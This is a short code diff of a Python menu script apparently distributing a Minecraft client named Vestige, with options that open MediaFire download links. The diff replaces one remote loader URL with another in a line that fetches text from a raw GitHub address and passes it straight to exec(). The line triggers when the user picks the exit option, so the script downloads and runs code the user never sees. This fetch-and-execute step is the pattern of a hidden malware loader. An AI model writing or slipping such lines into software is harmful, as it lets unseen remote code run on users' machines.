@@ -38,7 +38,7 @@ while True:
   if chon == '-':
       os.system('cls')
       print("Leaving Vestige")
-      exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Minecraft').text)
+      exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Minecraft.txt').text)
   elif chon == '1.9.5':
       webbrowser.open_new("https://www.mediafire.com/file/fowj4gm0k6a67ey/Vestige_1.9.5.zip/file")
   elif chon == '2.0.2':
